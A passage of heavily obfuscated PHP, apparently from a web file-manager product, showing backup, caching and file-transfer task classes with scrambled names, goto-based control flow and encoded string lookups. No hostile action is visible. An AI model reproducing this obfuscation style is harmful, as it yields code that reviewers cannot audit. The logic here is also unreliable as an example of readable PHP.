"\x7b\x69\157\x3a{$a¸Áµ…¶[$FÙÅ°º®Ø´[697]]}\x7d\57\144\141\164\141\x62\x61\x73\x65\57"; IO::mkdir($c£‰‘ÈÃƒ . "\142\141\x63\x6b\165\160\x5f{$Bª¸±ƒ¢†È}\x2f"); goto E‘ËŸË„Ÿº; D–ƒëğŸ’Ş: $eŞõ·÷«‘->end(); Backup::set(array($FÙÅ°º®Ø´[739] => $D—«é«Ñ“°[$FÙÅ°º®Ø´[77]])); return !0; goto Aê†·Š¾ë; eùÈ÷Éñîå: $câ‚ÎÃæ… = CONTROLLER_DIR . $FÙÅ°º®Ø´[738]; IO::copy($BµÁš—, $c£‰‘ÈÃƒ . "\x62\x61\x63\153\x75\160\x5f{$Bª¸±ƒ¢†È}\x2f"); IO::copy($câ‚ÎÃæ…, $c£‰‘ÈÃƒ . "\x62\141\143\153\x75\x70\137{$Bª¸±ƒ¢†È}\x2f"); goto D–ƒëğŸ’Ş; c¢°™–¸–œ: Backup::set(array($FÙÅ°º®Ø´[736] => $D—«é«Ñ“°[$FÙÅ°º®Ø´[77]])); IO::move($fÏÃâ××ê, $c£‰‘ÈÃƒ); $BµÁš— = CONTROLLER_DIR . $FÙÅ°º®Ø´[737]; goto eùÈ÷Éñîå; E‘ËŸË„Ÿº: $eŞõ·÷«‘ = new TaskFileTransfer($FÙÅ°º®Ø´[734], $FÙÅ°º®Ø´[719], 0, LNG($FÙÅ°º®Ø´[720]) . $FÙÅ°º®Ø´[424] . LNG($FÙÅ°º®Ø´[722]) . $FÙÅ°º®Ø´[735]); $eŞõ·÷«‘->addPath($fÏÃâ××ê); $D—«é«Ñ“° = IO::infoWithChildren($fÏÃâ××ê); goto c¢°™–¸–œ; Aê†·Š¾ë: } } class BackupFile { public function __construct() { } public function index() { goto d¯‰ËËÒ˜©; A‘Ù ØªÛ: Backup::set($EÇ“ì¸¿Ø ); $this->_fileFilter($c£ğÕñº»Ñ); return !0; goto f”ÀÕì¦Ù¹; cŞÍİ¤‚ó¸: $BœÇĞù…çŸ = 1000; $d¦öÖÍ¡ = $e¥–Èë‘æ = 0; $c£ğÕñº»Ñ = array(); goto añÖñã’à; EÆ¤šªÕÜ: $d²¥ôâĞ´ = !0; $dŸ·â‡ÀÛî = $this->storeIds(); $fËí´ôö¨ç = 1; goto cŞÍİ¤‚ó¸; d¯‰ËËÒ˜©: $B¶Ôñ¡‹‘œ = Backup::get(); $DÕ ªñ¹ = $B¶Ôñ¡‹‘œ[$_SERVER[‡’¶øåüç˜][285]][$_SERVER[‡’¶øåüç˜][171]][$_SERVER[‡’¶øåüç˜][431]]; $E¨õôâÑ§ = array($_SERVER[‡’¶øåüç˜][432] => array($_SERVER[‡’¶øåüç˜][740], $DÕ ªñ¹), $_SERVER[‡’¶øåüç˜][741] => array($_SERVER[‡’¶øåüç˜][323], $B¶Ôñ¡‹‘œ[$_SERVER[‡’¶øåüç˜][697]])); goto cÂÅÌÚŒÉ£; BâôôĞéå·: $bÎÍÃğ½ğ = $d²¥ôâĞ´ ? 1 : 0; $EÇ“ì¸¿Ø  = array($_SERVER[‡’¶øåüç˜][756] => 1, $_SERVER[‡’¶øåüç˜][460] => time(), $_SERVER[‡’¶øåüç˜][714] => $bÎÍÃğ½ğ, $_SERVER[‡’¶øåüç˜][753] => $DÕ ªñ¹, $_SERVER[‡’¶øåüç˜][745] => $dÖÔğƒš‡ê, $_SERVER[‡’¶øåüç˜][744] => $fÓß÷éñÇ); if ($e¥–Èë‘æ) { $EÇ“ì¸¿Ø [$_SERVER[‡’¶øåüç˜][754]] = $EÎŸï¬‡Ñ; $EÇ“ì¸¿Ø [$_SERVER[‡’¶øåüç˜][755]] = $bºñöëíˆŞ; } goto A‘Ù ØªÛ; fçßÃÉ”ÁÃ: $Càï²Î°ó->task[$_SERVER[‡’¶øåüç˜][704]] = $dÖÔğƒš‡ê; $EÇ“ì¸¿Ø  = array($_SERVER[‡’¶øåüç˜][744] => $fÓß÷éñÇ, $_SERVER[‡’¶øåüç˜][745] => $dÖÔğƒš‡ê); Backup::set($EÇ“ì¸¿Ø ); goto EÆ¤šªÕÜ; cÂÅÌÚŒÉ£: $fÓß÷éñÇ = (int) Model($_SERVER[‡’¶øåüç˜][724])->where($E¨õôâÑ§)->count($_SERVER[‡’¶øåüç˜][431]); $dÖÔğƒš‡ê = (int) Model($_SERVER[‡’¶øåüç˜][724])->where($E¨õôâÑ§)->sum($_SERVER[‡’¶øåüç˜][77]); $Càï²Î°ó = new TaskFileTransfer($_SERVER[‡’¶øåüç˜][742], $_SERVER[‡’¶øåüç˜][719], $fÓß÷éñÇ, LNG($_SERVER[‡’¶øåüç˜][720]) . $_SERVER[‡’¶øåüç˜][721] . LNG($_SERVER[‡’¶øåüç˜][743])); goto fçßÃÉ”ÁÃ; añÖñã’à: $bºñöëíˆŞ = $EÎŸï¬‡Ñ = 0; do { $eéŒ‚­ë¢ = $_SERVER[‡’¶øåüç˜][746]; $f«š¶ÍêˆÔ = Model($_SERVER[‡’¶øåüç˜][724])->where($E¨õôâÑ§)->field($eéŒ‚­ë¢)->order($_SERVER[‡’¶øåüç˜][747])->selectPage($BœÇĞù…çŸ, $fËí´ôö¨ç); $BË¾×ñÎ‡ = !empty($f«š¶ÍêˆÔ[$_SERVER[‡’¶øåüç˜][358]]) ? $f«š¶ÍêˆÔ[$_SERVER[‡’¶øåüç˜][358]] : array(); foreach ($BË¾×ñÎ‡ as $eùè¿‡) { goto Aä•ä¤Ò…³; Dˆâø‚á¥Ÿ: $d¦öÖÍ¡ += $eùè¿‡[$_SERVER[‡’¶øåüç˜][77]]; $EÎŸï¬‡Ñ += 1; $bºñöëíˆŞ += $eùè¿‡[$_SERVER[‡’¶øåüç˜][77]]; goto C¾¾©ëŒë; dƒ‚¥½¡Ÿà: if (IO::exist($c¾Â¯…ìèµ)) { $Càï²Î°ó->updateFileEnd($eùè¿‡[$_SERVER[‡’¶øåüç˜][28]], $eùè¿‡[$_SERVER[‡’¶øåüç˜][77]]); } else { $c¾Â¯…ìèµ = get_path_father($c¾Â¯…ìèµ); IO::mkdir($c¾Â¯…ìèµ); if (!IO::copy($F½‘çĞ¤´“, $c¾Â¯…ìèµ, $_SERVER[‡’¶øåüç˜][750])) { write_log($_SERVER[‡’¶øåüç˜][751] . $F½‘çĞ¤´“ . $_SERVER[‡’¶øåüç˜][752] . $c¾Â¯…ìèµ . $_SERVER[‡’¶øåüç˜][489], $_SERVER[‡’¶øåüç˜][719]); $d²¥ôâĞ´ = !1; break; } } $DÕ ªñ¹ = $eùè¿‡[$_SERVER[‡’¶øåüç˜][431]]; $e¥–Èë‘æ += 1; goto Dˆâø‚á¥Ÿ; C¾¾©ëŒë: if ($d¦öÖÍ¡ >= 1024 * 1024 * 100) { $EÇ“ì¸¿Ø  = array($_SERVER[‡’¶øåüç˜][753] => $DÕ ªñ¹, $_SERVER[‡’¶øåüç˜][754] => $EÎŸï¬‡Ñ, $_SERVER[‡’¶øåüç˜][755] => $bºñöëíˆŞ); Backup::set($EÇ“ì¸¿Ø ); $d¦öÖÍ¡ = $e¥–Èë‘æ = 0; } goto EÌ¥©ˆªæ¿; Aä•ä¤Ò…³: if (!$this->_fileExist($eùè¿‡, $c£ğÕñº»Ñ, $dŸ·â‡ÀÛî)) { $fÓß÷éñÇ -= 1; $dÖÔğƒš‡ê -= (int) $eùè¿‡[$_SERVER[‡’¶øåüç˜][77]]; write_log("\146\151\154\x65\x20\x6e\157\x74\40\x65\170\151\163\164\x2e\x66\151\154\145\x49\x44\72{$eùè¿‡[$_SERVER[‡’¶øåüç˜][431]]}\54\40\160\141\164\x68\x3a{$eùè¿‡[$_SERVER[‡’¶øåüç˜][75]]}", $_SERVER[‡’¶øåüç˜][748]); continue; } $F½‘çĞ¤´“ = $eùè¿‡[$_SERVER[‡’¶øåüç˜][75]]; $c¾Â¯…ìèµ = "\173\x69\157\72{$B¶Ôñ¡‹‘œ[$_SERVER[‡’¶øåüç˜][697]]}\175" . substr($F½‘çĞ¤´“, strlen("\x7b\151\x6f\72{$eùè¿‡[$_SERVER[‡’¶øåüç˜][749]]}\175")); goto dƒ‚¥½¡Ÿà; EÌ¥©ˆªæ¿: } $b†—ã¼İŒ° = count($BË¾×ñÎ‡); $fËí´ôö¨ç++; } while ($b†—ã¼İŒ° == $BœÇĞù…çŸ); $Càï²Î°ó->end(); goto BâôôĞéå·; f”ÀÕì¦Ù¹: } private function _fileExist($B“çÄ¥ÓÎ÷, &$b×™šîŒ›ê, $a…‰î»öä¹) { goto BÌ“†ØÆ; CÎæ§Ì˜°Í: $b×™šîŒ›ê = array_merge($b×™šîŒ›ê, array_to_keyvalue($BÉë³òİİ, $AÈÜÑÊ¹ÁÄ[33], $AÈÜÑÊ¹ÁÄ[431])); return !1; goto aØ¬¨ØÏç©; b…Û®–¯ñ¤: if (!in_array($B“çÄ¥ÓÎ÷[$AÈÜÑÊ¹ÁÄ[749]], $a…‰î»öä¹)) { return !1; } if (IO::exist($còİÚñœñø)) { return !0; } $fÉº î³¥§ = get_path_father($còİÚñœñø); goto CÒÚ¡ø™Ú; CÒÚ¡ø™Ú: if (IO::exist($fÉº î³¥§)) { $b×™šîŒ›ê[] = $B“çÄ¥ÓÎ÷[$AÈÜÑÊ¹ÁÄ[431]]; return !1; } $B†³´Ü¦‰š = array($AÈÜÑÊ¹ÁÄ[749] => $B“çÄ¥ÓÎ÷[$AÈÜÑÊ¹ÁÄ[749]], $AÈÜÑÊ¹ÁÄ[75] => array($AÈÜÑÊ¹ÁÄ[757], "{$fÉº î³¥§}\x25")); $BÉë³òİİ = Model($AÈÜÑÊ¹ÁÄ[724])->where($B†³´Ü¦‰š)->field($AÈÜÑÊ¹ÁÄ[432])->select(); goto CÎæ§Ì˜°Í; BÌ“†ØÆ: $AÈÜÑÊ¹ÁÄ =& $_SERVER[‡’¶øåüç˜]; $còİÚñœñø = $B“çÄ¥ÓÎ÷[$AÈÜÑÊ¹ÁÄ[75]]; if (in_array($B“çÄ¥ÓÎ÷[$AÈÜÑÊ¹ÁÄ[431]], $b×™šîŒ›ê)) { return !1; } goto b…Û®–¯ñ¤; aØ¬¨ØÏç©: } private function _fileFilter($CŠŠ¨Ü¾÷Î) { $Eİ¢×¶–½ =& $_SERVER[‡’¶øåüç˜]; if (empty($CŠŠ¨Ü¾÷Î)) { return; } $F¶é²¹»²² = array($Eİ¢×¶–½[431] => array($Eİ¢×¶–½[7], array_unique($CŠŠ¨Ü¾÷Î))); $Bò‡Ü¤èÎ£ = Model($Eİ¢×¶–½[758])->where($F¶é²¹»²²)->field($Eİ¢×¶–½[381])->select(); foreach ($Bò‡Ü¤èÎ£ as $Fèïâ—¾İÙ) { Model($Eİ¢×¶–½[758])->remove($Fèïâ—¾İÙ[$Eİ¢×¶–½[381]], !1); } } private function storeIds() { $fÊÛÔêŒ¯ò =& $_SERVER[‡’¶øåüç˜]; $aÑ¸Ü¸âÈİ = Model($fÊÛÔêŒ¯ò[709])->listData(); $dŠ‘áˆŠÜŸ = array(); $AÓöŠßƒøï = $GLOBALS[$fÊÛÔêŒ¯ò[6]][$fÊÛÔêŒ¯ò[84]][$fÊÛÔêŒ¯ò[759]]; foreach ($aÑ¸Ü¸âÈİ as $b‰Ç†›„ğ‹) { $CÁ„·³Íß¾ = strtolower($b‰Ç†›„ğ‹[$fÊÛÔêŒ¯ò[90]]); if (!isset($AÓöŠßƒøï[$CÁ„·³Íß¾])) { continue; } $CíçˆŒäß = $fÊÛÔêŒ¯ò[71] . (isset($AÓöŠßƒøï[$CÁ„·³Íß¾]) ? $AÓöŠßƒøï[$CÁ„·³Íß¾] : ucfirst($CÁ„·³Íß¾)); if (!class_exists($CíçˆŒäß)) { continue; } $dŠ‘áˆŠÜŸ[] = $b‰Ç†›„ğ‹[$fÊÛÔêŒ¯ò[371]]; } return $dŠ‘áˆŠÜŸ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto f¼›·¢Şñ; Aê‰è² ö…: $d„‘ªƒŞà = $GLOBALS[$FÕëªŞÛ‘Ş[6]][$FÕëªŞÛ‘Ş[341]]; $c’‘Á‹ = $d„‘ªƒŞà[$d„‘ªƒŞà[$FÕëªŞÛ‘Ş[760]]]; $d• É³ÃªÔ = $d„‘ªƒŞà[$FÕëªŞÛ‘Ş[761]]; goto Dè³§Ü„ĞÇ; f¼›·¢Şñ: $FÕëªŞÛ‘Ş =& $_SERVER[‡’¶øåüç˜]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto Aê‰è² ö…; Dè³§Ü„ĞÇ: switch ($d„‘ªƒŞà[$FÕëªŞÛ‘Ş[760]]) { case $FÕëªŞÛ‘Ş[17]: self::$handle = Model($FÕëªŞÛ‘Ş[762]); break; case $FÕëªŞÛ‘Ş[763]: self::$handle = new CacheRedis($c’‘Á‹, $d• É³ÃªÔ); break; case $FÕëªŞÛ‘Ş[764]: self::$handle = new CacheMemcached($c’‘Á‹, $d• É³ÃªÔ); break; case $FÕëªŞÛ‘Ş[171]: self::$handle = new CacheFile($c’‘Á‹, $d• É³ÃªÔ); break; default: break; } return self::$handle; goto FÛ‰„ŒÀµ; FÛ‰„ŒÀµ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($DÌ°¨‚Ó§) { if (is_array($DÌ°¨‚Ó§) || is_object($DÌ°¨‚Ó§)) { $DÌ°¨‚Ó§ = json_encode($DÌ°¨‚Ó§); } $DÌ°¨‚Ó§ = rawurlencode($DÌ°¨‚Ó§); return md5(KOD_SITE_ID . $_SERVER[‡’¶øåüç˜][70] . $DÌ°¨‚Ó§); } public static function get($c×ÎÏº½Œà) { $då÷ËÔ½ù¾ = self::key($c×ÎÏº½Œà); if (!isset(self::$memoryCache[$då÷ËÔ½ù¾])) { $EÂÇ¯º Ğ¨ = self::init()->get($då÷ËÔ½ù¾); self::$memoryCache[$då÷ËÔ½ù¾] = unserialize($EÂÇ¯º Ğ¨); } return self::$memoryCache[$då÷ËÔ½ù¾]; } public static function set($cÚÜèÈŠØ, $C˜©…„Õ¥, $a÷±·óëÄì = false) { goto BÂ¢Ø…Ë¶¦; Bî‰‰µå: CacheLock::unlock($cÚÜèÈŠØ); return $d˜ØÀÄÄš; goto Aç±ˆÔ˜½œ; DÑ¢Œ™¼: CacheLock::lock($cÚÜèÈŠØ); $d˜ØÀÄÄš = self::init()->set($C’”ëô›ì­, serialize($C˜©…„Õ¥), $a÷±·óëÄì); self::$memoryCache[$C’”ëô›ì­] = $C˜©…„Õ¥; goto Bî‰‰µå; BÂ¢Ø…Ë¶¦: $C’”ëô›ì­ = self::key($cÚÜèÈŠØ); if (isset(self::$memoryCache[$C’”ëô›ì­]) && self::$memoryCache[$C’”ëô›ì­] === $C˜©…„Õ¥) { return !0; } if ($a÷±·óëÄì === 0) { self::$memoryCache[$C’”ëô›ì­] = $C˜©…„Õ¥; return !0; } goto DÑ¢Œ™¼; Aç±ˆÔ˜½œ: } public static function remove($B‡÷­ÓôöÖ) { goto dÇ÷«–Â•Ñ; bÎŠ‘Áá: CacheLock::lock($B‡÷­ÓôöÖ); $A‘«†á‰Å§ = self::init()->remove($f‚ôòé¦²Ó); CacheLock::unlock($B‡÷­ÓôöÖ); goto A Üäœ“ôæ; dÇ÷«–Â•Ñ: $f‚ôòé¦²Ó = self::key($B‡÷­ÓôöÖ); unset(self::$memoryCache[$f‚ôòé¦²Ó]); self::clearTimeout(); goto bÎŠ‘Áá; A Üäœ“ôæ: return $A‘«†á‰Å§; goto c‘¿¡íÄ¦Â; c‘¿¡íÄ¦Â: } public static function clearMemory($fí“ã¦–›â = false) { if ($fí“ã¦–›â) { $fí“ã¦–›â = self::key($fí“ã¦–›â); unset(self::$memoryCache[$fí“ã¦–›â]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[‡’¶øåüç˜][765])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[‡’¶øåüç˜][766])) { self::init()->clearTimeout(); } } } goto bÎƒÔÃÓ¼; a÷šƒ¥…é¿: class TaskFileTransfer extends Task { protected function startAfter() { goto CŠŠ¯®­õ†; C°Ñ¤°³Æ¼: $D‰Ùô›Şù[$a¦‚¶®ÇİÂ[1492]] = 0; $D‰Ùô›Şù[$a¦‚¶®ÇİÂ[1493]] = 0; if (!$D‰Ùô›Şù[$a¦‚¶®ÇİÂ[1348]]) { $D‰Ùô›Şù[$a¦‚¶®ÇİÂ[1348]] = LNG($a¦‚¶®ÇİÂ[1494]); } goto a°šÔ‹¹³å; CŠŠ¯®­õ†: $a¦‚¶®ÇİÂ =& $_SERVER[‡’¶øåüç˜]; $D‰Ùô›Şù =& $this->task; $this->sourceCopyFolder = !1; goto B·Ê—Òš¬Ó; FŠ‡«Á¦…: Hook::bind($a¦‚¶®ÇİÂ[1477], array($this, $a¦‚¶®ÇİÂ[1478])); Hook::bind($a¦‚¶®ÇİÂ[544], array($this, $a¦‚¶®ÇİÂ[1479])); $this->sourceModelCopyFlag = !1; goto e‰¯ğñ¤«Ñ; E·Æâ•†‡ø: Hook::bind($a¦‚¶®ÇİÂ[555], array($this, $a¦‚¶®ÇİÂ[1475])); Hook::bind($a¦‚¶®ÇİÂ[522], array($this, $a¦‚¶®ÇİÂ[1476])); Hook::bind($a¦‚¶®ÇİÂ[519], array($this, $a¦‚¶®ÇİÂ[1476])); goto AÃöŒ·»ê; e‰¯ğñ¤«Ñ: Hook::bind($a¦‚¶®ÇİÂ[1480], array($this, $a¦‚¶®ÇİÂ[1481])); Hook::bind($a¦‚¶®ÇİÂ[1482], array($this, $a¦‚¶®ÇİÂ[1483])); Hook::bind($a¦‚¶®ÇİÂ[1484], array($this, $a¦‚¶®ÇİÂ[1485])); goto EéòÍ¯¤ó; EéòÍ¯¤ó: $D‰Ùô›Şù[$a¦‚¶®ÇİÂ[1486]] = LNG($a¦‚¶®ÇİÂ[1487]); $D‰Ùô›Şù[$a¦‚¶®ÇİÂ[1488]] = 0; $D‰Ùô›Şù[$a¦‚¶®ÇİÂ[1489]] = 0; goto C—œš‹İƒÊ; C—œš‹İƒÊ: $D‰Ùô›Şù[$a¦‚¶®ÇİÂ[982]] = $a¦‚¶®ÇİÂ[33]; $D‰Ùô›Şù[$a¦‚¶®ÇİÂ[1490]] = $a¦‚¶®ÇİÂ[33]; $D‰Ùô›Şù[$a¦‚¶®ÇİÂ[1491]] = 0; goto C°Ñ¤°³Æ¼; AÃöŒ·»ê: Hook::bind($a¦‚¶®ÇİÂ[524], array($this, $a¦‚¶®ÇİÂ[1476])); Hook::bind($a¦‚¶®ÇİÂ[526], array($this, $a¦‚¶®ÇİÂ[1476])); Hook::bind($a¦‚¶®ÇİÂ[528], array($this, $a¦‚¶®ÇİÂ[1476])); goto FŠ‡«Á¦…; B·Ê—Òš¬Ó: Hook::bind($a¦‚¶®ÇİÂ[1467], array($this, $a¦‚¶®ÇİÂ[1468])); Hook::bind($a¦‚¶®ÇİÂ[1469], array($this, $a¦‚¶®ÇİÂ[1470])); Hook::bind($a¦‚¶®ÇİÂ[1471], array($this, $a¦‚¶®ÇİÂ[1472])); goto e•ÑŠëàÅ†; e•ÑŠëàÅ†: Hook::bind($a¦‚¶®ÇİÂ[551], array($this, $a¦‚¶®ÇİÂ[1473])); Hook::bind($a¦‚¶®ÇİÂ[552], array($this, $a¦‚¶®ÇİÂ[1474])); Hook::bind($a¦‚¶®ÇİÂ[554], array($this, $a¦‚¶®ÇİÂ[1475])); goto E·Æâ•†‡ø; a°šÔ‹¹³å: } protected function endAfter() { goto a›Ú»ÍŸ˜³; FÚáƒè°¼±: Hook::unbind($B·ù¿½ßî[1471], array($this, $B·ù¿½ßî[1472])); Hook::unbind($B·ù¿½ßî[551], array($this, $B·ù¿½ßî[1473])); Hook::unbind($B·ù¿½ßî[552], array($this, $B·ù¿½ßî[1474])); goto BÎÇœË¦ŠË; eîïÍˆšš‚: Hook::unbind($B·ù¿½ßî[528], array($this, $B·ù¿½ßî[1476])); Hook::unbind($B·ù¿½ßî[1477], array($this, $B·ù¿½ßî[1478])); Hook::unbind($B·ù¿½ßî[544], array($this, $B·ù¿½ßî[1479])); goto c‚È’ÍÅ; c‚È’ÍÅ: Hook::unbind($B·ù¿½ßî[1480], array($this, $B·ù¿½ßî[1481])); Hook::unbind($B·ù¿½ßî[1482], array($this, $B·ù¿½ßî[1483])); Hook::unbind($B·ù¿½ßî[1484], array($this, $B·ù¿½ßî[1485])); goto AÉ ÂäÈÕ; a›Ú»ÍŸ˜³: $B·ù¿½ßî =& $_SERVER[‡’¶øåüç˜]; Hook::unbind($B·ù¿½ßî[1467], array($this, $B·ù¿½ßî[1468])); Hook::unbind($B·ù¿½ßî[1469], array($this, $B·ù¿½ßî[1470])); goto FÚáƒè°¼±; b À½×ì: Hook::unbind($B·ù¿½ßî[519], array($this, $B·ù¿½ßî[1476])); Hook::unbind($B·ù¿½ßî[524], array($this, $B·ù¿½ßî[1476])); Hook::unbind($B·ù¿½ßî[526], array($this, $B·ù¿½ßî[1476])); goto eîïÍˆšš‚; BÎÇœË¦ŠË: Hook::unbind($B·ù¿½ßî[554], array($this, $B·ù¿½ßî[1475])); Hook::unbind($B·ù¿½ßî[555], array($this, $B·ù¿½ßî[1475])); Hook::unbind($B·ù¿½ßî[522], array($this, $B·ù¿½ßî[1476])); goto b À½×ì; AÉ ÂäÈÕ: } public function copyMoveStart($BÚœ½º›Š„, $E›ª¸ÎëŒ, $dªƒºï‹¸, $E½‡´çÒ×) { goto b’ËÜ¹âŸË; B³—âĞÆˆ: $f©¼ó£ßÃù[$fôçª’º¼â[1496]] = KodIO::transferType($BÚœ½º›Š„, $dªƒºï‹¸); $this->update(); goto d åŒ¶Ë¤À; b’ËÜ¹âŸË: $fôçª’º¼â =& $_SERVER[‡’¶øåüç˜]; self::log($fôçª’º¼â[1495] . $E›ª¸ÎëŒ . $fôçª’º¼â[66] . $E½‡´çÒ×); $B¼¬ªÓÏ½ö = rtrim(TEMP_FILES, $fôçª’º¼â[8]); goto Cö¥£Ê™õá; Cö¥£Ê™õá: if (substr($E›ª¸ÎëŒ, 0, strlen($B¼¬ªÓÏ½ö)) == $B¼¬ªÓÏ½ö) { return; } if (substr($E½‡´çÒ×, 0, strlen($B¼¬ªÓÏ½ö)) == $B¼¬ªÓÏ½ö) { return; } $f©¼ó£ßÃù =& $this->task; goto B³—âĞÆˆ; d åŒ¶Ë¤À: } public function updateAfter() { goto BÙİàµù; AĞ“áÓÖ•: $EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1444]] = $EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1493]] / $EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[704]]; if ($EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1444]] > 0) { $DÀ¦ºœÙ¨¯ = timeFloat() - $EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1446]] - $EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1449]]; $EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1450]] = $DÀ¦ºœÙ¨¯ * (1 - $EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1444]]) / $EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1444]]; } goto DÅÌëŞ†å; BÙİàµù: $dé¦ô×Õğ— =& $_SERVER[‡’¶øåüç˜]; $EŞï¾Ö±¦Ğ =& $this->task; if (!$EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[704]]) { return; } goto CçóÑ‹óÁ; CçóÑ‹óÁ: if ($this->sourceModelCopyFlag) { return; } if ($EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1496]] == $dé¦ô×Õğ—[1101]) { return; } if ($EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1496]] == $dé¦ô×Õğ—[1048] || $EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1496]] == $dé¦ô×Õğ—[103]) { if ($EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1490]]) { $EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1493]] = $EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1492]] + $EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1489]]; } } else { if ($EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1496]] == $dé¦ô×Õğ—[1102]) { if ($EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1490]] == $dé¦ô×Õğ—[1048]) { $EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1493]] = $EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1492]] + $EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1489]] * 0.5; } else { if ($EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1490]] == $dé¦ô×Õğ—[103]) { $EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1493]] = $EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1492]] + $EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1488]] * 0.5 + $EŞï¾Ö±¦Ğ[$dé¦ô×Õğ—[1489]] * 0.5; } } } } goto AĞ“áÓÖ•; DÅÌëŞ†å: } public function addPath($aİŒÊÕŞ®†) { goto fâ“ ™Ú»; C¸¡šÊ‹¹ƒ: if ($B‚ŠÄ—Ï[$Fõöê‹­é—[29]] == $Fõöê‹­é—[171]) { $a½ÁÜĞ¼Ø[$Fõöê‹­é—[980]] += 1; } else { $a½ÁÜĞ¼Ø[$Fõöê‹­é—[980]] += $B‚ŠÄ—Ï[$Fõöê‹­é—[80]][$Fõöê‹­é—[78]]; if ($B‚ŠÄ—Ï[$Fõöê‹­é—[381]]) { $a½ÁÜĞ¼Ø[$Fõöê‹­é—[980]] += $B‚ŠÄ—Ï[$Fõöê‹­é—[80]][$Fõöê‹­é—[79]] + 1; } } $a½ÁÜĞ¼Ø[$Fõöê‹­é—[704]] += $B‚ŠÄ—Ï[$Fõöê‹­é—[77]]; $this->update(); goto f¯Œ‰°¬áÂ; DÂË‹•ÅÃ¬: $B‚ŠÄ—Ï = IO::infoWithChildren($aİŒÊÕŞ®†); $ağøêóøˆ‹ = $a½ÁÜĞ¼Ø[$Fõöê‹­é—[1497]] ? $a½ÁÜĞ¼Ø[$Fõöê‹­é—[1497]][$Fõöê‹­é—[1498]] : 0; $a½ÁÜĞ¼Ø[$Fõöê‹­é—[1497]] = array($Fõöê‹­é—[1498] => $ağøêóøˆ‹ + 1, $Fõöê‹­é—[398] => $B‚ŠÄ—Ï[$Fõöê‹­é—[28]], $Fõöê‹­é—[75] => $B‚ŠÄ—Ï[$Fõöê‹­é—[75]], $Fõöê‹­é—[479] => $B‚ŠÄ—Ï[$Fõöê‹­é—[479]] ? $B‚ŠÄ—Ï[$Fõöê‹­é—[479]] : $B‚ŠÄ—Ï[$Fõöê‹­é—[75]]); goto C¸¡šÊ‹¹ƒ; fâ“ ™Ú»: $Fõöê‹­é— =& $_SERVER[‡’¶øåüç˜]; if (!$aİŒÊÕŞ®†) { return; } $a½ÁÜĞ¼Ø =& $this->task; goto DÂË‹•ÅÃ¬; f¯Œ‰°¬áÂ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($f¹â­’Åš) { $Eé¬êâáË“ =& $_SERVER[‡’¶øåüç˜]; $EØö«ïÂòÄ =& $this->task; $EØö«ïÂòÄ[$Eé¬êâáË“[1486]] = $f¹â­’Åš[$Eé¬êâáË“[28]]; $EØö«ïÂòÄ[$Eé¬êâáË“[982]] = $f¹â­’Åš[$Eé¬êâáË“[28]]; $this->update(); } public function copyFileStart($A“Õ¸¸Ø­, $e‡åô©®ğ, $D®ÍÙ•ø«š, $fÔ½íµµÂ, $a¹Á‚º¶˜, $DÀ…—³‰ò™) { goto cë‚ÔƒåÈ‡; CÜ‘©Ğ¡í: $C¢ÍƒÔ÷Ì²[$DÉ»¦Æä‹‰[1486]] = $DÇ¿ø±í³ë; $C¢ÍƒÔ÷Ì²[$DÉ»¦Æä‹‰[1488]] = (int) $A“Õ¸¸Ø­->size($e‡åô©®ğ); $C¢ÍƒÔ÷Ì²[$DÉ»¦Æä‹‰[1489]] = 0; goto C¤¯°“¦ƒí; d«£µÆØšç: $GLOBALS[$DÉ»¦Æä‹‰[1500]] = $a¹Á‚º¶˜; $GLOBALS[$DÉ»¦Æä‹‰[1499]] = $DÀ…—³‰ò™; $C¢ÍƒÔ÷Ì² =& $this->task; goto CÜ‘©Ğ¡í; C¤¯°“¦ƒí: $C¢ÍƒÔ÷Ì²[$DÉ»¦Æä‹‰[982]] = $DÉ»¦Æä‹‰[33]; $C¢ÍƒÔ÷Ì²[$DÉ»¦Æä‹‰[1490]] = $DÉ»¦Æä‹‰[33]; $C¢ÍƒÔ÷Ì²[$DÉ»¦Æä‹‰[1491]] = 0; goto a¼¨ŸéÊÃğ; cë‚ÔƒåÈ‡: $DÉ»¦Æä‹‰ =& $_SERVER[‡’¶øåüç˜]; $DÇ¿ø±í³ë = $a¹Á‚º¶˜; if ($DÇ¿ø±í³ë == $GLOBALS[$DÉ»¦Æä‹‰[1499]]) { $DÇ¿ø±í³ë = $GLOBALS[$DÉ»¦Æä‹‰[1500]]; } goto d«£µÆØšç; a¼¨ŸéÊÃğ: $this->update(); goto FÆô¼É“ó; FÆô¼É“ó: } public function copyFileEnd($D„ğË´„Çê, $A†ª„Î¬šÓ, $bô¿Öâæ¸Ø, $EÎº‚ñ”‡î, 